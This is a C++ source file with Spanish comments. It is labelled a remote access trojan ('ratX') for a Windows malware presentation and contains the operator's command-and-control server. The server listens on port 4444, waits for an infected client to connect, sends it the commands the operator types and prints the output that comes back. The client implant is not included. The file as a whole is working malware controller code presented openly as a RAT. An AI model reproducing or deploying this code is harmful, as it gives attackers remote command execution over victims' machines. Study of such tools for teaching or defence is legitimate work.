// ratX - C++ rat (para Windows 10 presentación de malware)
#include <iostream>
#include <winsock2.h>
#include <string>

#pragma comment(lib, "ws2_32.lib") // Enlaza la librería Winsock para manejo de sockets

#define PORT 4444 // Puerto donde el servidor escuchará conexiones entrantes
#define BUFFER_SIZE 8192  // Tamaño del buffer de datos (8KB)

// Función para inicializar Winsock
void initWinsock() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "Error al inicializar Winsock" << std::endl;
        exit(1);
    }
}

int main() {
    initWinsock(); // Inicializa Winsock antes de usar sockets

    SOCKET serverSocket, clientSocket;
    struct sockaddr_in server, client;
    int clientSize = sizeof(client);

    // Crea un socket TCP
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Error al crear el socket" << std::endl;
        return 1;
    }

    // Configura la estructura del servidor
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY; // Acepta conexiones de cualquier IP
    server.sin_port = htons(PORT); // Convierte el puerto a formato de red

    // Enlaza el socket al puerto especificado
    if (bind(serverSocket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Error al enlazar el socket" << std::endl;
        return 1;
    }

    // Pone el socket en modo de escucha para aceptar conexiones
    listen(serverSocket, 3);
    std::cout << "[+] Esperando conexiones en el puerto " << PORT << "..." << std::endl;

    // Acepta una conexión entrante de un cliente
    clientSocket = accept(serverSocket, (struct sockaddr*)&client, &clientSize);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error al aceptar conexión" << std::endl;
        return 1;
    }
    std::cout << "[+] Cliente conectado!" << std::endl;

    char buffer[BUFFER_SIZE];
    while (true) {
        std::cout << "\n> ";
        std::string command;
        std::getline(std::cin, command); // Lee el comando de la entrada estándar
        if (command.empty()) continue;

        // Envía el comando al cliente
        send(clientSocket, command.c_str(), command.length(), 0);

        std::string fullResponse;
        while (true) {
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived <= 0) break;
            buffer[bytesReceived] = '\0'; // Asegura que el buffer termine en null
            fullResponse += buffer;

            // Verifica si el mensaje contiene el delimitador de fin de respuesta
            if (fullResponse.find("[END]") != std::string::npos) {
                fullResponse = fullResponse.substr(0, fullResponse.find("[END]")); // Elimina el delimitador
                break;
            }
        }
        std::cout << "Respuesta:\n" << fullResponse << std::endl; // Muestra la respuesta del cliente
    }

    // Cierra los sockets y limpia Winsock
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    return 0;
}